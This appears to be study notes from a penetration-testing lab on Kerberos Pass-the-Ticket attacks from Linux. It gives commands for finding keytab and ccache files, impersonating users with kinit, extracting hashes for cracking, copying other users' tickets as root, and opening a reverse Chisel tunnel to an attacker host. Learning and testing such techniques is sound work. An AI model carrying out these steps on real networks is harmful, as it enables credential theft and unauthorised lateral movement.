# Pass the Ticket (PtT) from Linux

Linux systems integrated with Active Directory (AD) often use Kerberos for authentication. This allows for "Pass the Ticket" attacks similar to Windows, utilizing Ticket Granting Tickets (TGT) and Service Tickets (TGS).

## Core Concepts

*   **Credential Cache (ccache):** Holds Kerberos credentials (tickets) for the duration of a user's session.
    *   **Location:** Typically stored in `/tmp`.
    *   **Pointer:** The environment variable `KRB5CCNAME` points to the current ccache file (e.g., `FILE:/tmp/krb5cc_1000`).
*   **Keytab Files:** Files containing pairs of Kerberos principals and encrypted keys (derived from passwords).
    *   **Use:** Allow scripts/services to authenticate without user interaction.
    *   **Security:** Anyone with read access to a keytab can impersonate the principals within it.
    *   **Creation:** Can be created on any system with a Kerberos client and moved. Valid regardless of origin system.

---

## 1. Discovery: Identifying AD Integration

Determine if the Linux host is domain-joined or utilizing AD authentication.


### Method A: using `realm`
The `realm` command manages system enrollment.
```bash
realm list
```

### Method B: Checking Running Processes
If `realm` is absent, check for `sssd` (System Security Services Daemon) or `winbind`.
```bash
ps -ef | grep -i "winbind\|sssd"
```

---

## 2. Hunting for Kerberos Tickets

### Finding Keytab Files
Keytabs are often used by services or automated scripts.

**Search by filename extension:**
```bash
find / -name *keytab* -ls 2>/dev/null
```
*Requirement: Read/Write privileges are needed to use the file directly.*

**Search in Cronjobs:**
Admins may hardcode `kinit` commands in cron scripts.
```bash
crontab -l
# Look for lines like: kinit user@DOMAIN.COM -k -t /path/to/file.keytab
```
*Note: Default system keytab is often at `/etc/krb5.keytab` (requires root).*

### Finding ccache Files
**Check Environment Variables:**
See if the current user has an active ticket.
```bash
env | grep -i krb5
# Output example: KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

**Search /tmp Directory:**
If you have **root** privileges, you can see (and steal) tickets for other logged-in users.
```bash
ls -la /tmp
# Look for files matching the pattern: krb5cc_[UID]
```

---

## 3. Exploitation: Abusing Keytab Files

If you find a readable keytab file, you can impersonate the user or extract their secrets.

### Option A: Impersonation (Pass the Ticket)

1.  **Identify the Principal:**
    Use `klist` to see which user the keytab belongs to.
    ```bash
    klist -k -t /path/to/target.keytab
    ```

2.  **Import the Ticket:**
    Use `kinit` to request a TGT using the keytab. *Note: Case-sensitive.*
    ```bash
    # Syntax: kinit [principal] -k -t [keytab_path]
    kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
    ```

3.  **Verify:**
    ```bash
    klist
    ```

4.  **Access Resources:**
    ```bash
    smbclient //dc01/share -k -c ls
    ```

### Option B: Extracting Hashes (Offline Cracking)

You can extract NTLM or AES hashes from the keytab to crack offline or use in Pass-the-Hash attacks.

**Tool:** [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

1.  **Extract:**
    ```bash
    python3 keytabextract.py /path/to/target.keytab
    ```
2.  **Crack:**
    Use the extracted NTLM hash with Hashcat/John or online crackers (e.g., CrackStation).

---

## 4. Exploitation: Abusing ccache Files

If you have root access or find a readable ccache file in `/tmp`.

1.  **Identify Target:**
    Check file ownership/groups to find high-value targets (e.g., Domain Admins).
    ```bash
    # Check user ID against groups
    id username@domain.com
    ```

2.  **Steal the Ticket:**
    Copy the target's ccache file to a location you control.
    ```bash
    cp /tmp/krb5cc_647401106_I8I133 /root/stolen_ticket
    ```

3.  **Import the Ticket:**
    Set the `KRB5CCNAME` environment variable to the path of the stolen file.
    ```bash
    export KRB5CCNAME=/root/stolen_ticket
    ```

4.  **Verify & Use:**
    ```bash
    klist
    # Note expiration time. Expired tickets are useless.
    
    # Access remote system without password
    smbclient //dc01/C$ -k -c ls -no-pass
    ```

---

## 5. Lateral Movement from Non-Domain Machines

If your attack host (e.g., Kali) is not domain-joined, you cannot use Kerberos directly without networking prep.

### Prerequisites
1.  **Name Resolution:**
    The attack host must resolve the Domain Controller (KDC) and target hostnames.
    *   Edit `/etc/hosts` on your attack machine:
        ```text
        172.16.1.10  dc01.inlanefreight.htb  inlanefreight.htb
        ```

2.  **Network Proxying:**
    If the target is segmented, tunnel traffic via a compromised Linux host using **Chisel** and **Proxychains**.

### Setup Steps

1.  **Server (Attack Host):**
    ```bash
    ./chisel server --reverse --port 8080
    ```

2.  **Client (Compromised Host):**
    ```bash
    ./chisel client [ATTACK_IP]:8080 R:socks
    ```

3.  **Proxychains Config (`/etc/proxychains.conf`):**
    Ensure it points to the Chisel port (default 1080).
    ```text
    [ProxyList]
    socks5 127.0.0.1 1080
    ```

4.  **Execute Tools:**
    Run tools through proxychains using the stolen ticket (ensure `KRB5CCNAME` is set on the attack host if you moved the ccache file there).
    ```bash
    proxychains smbclient //dc01/C$ -k -no-pass
    ```
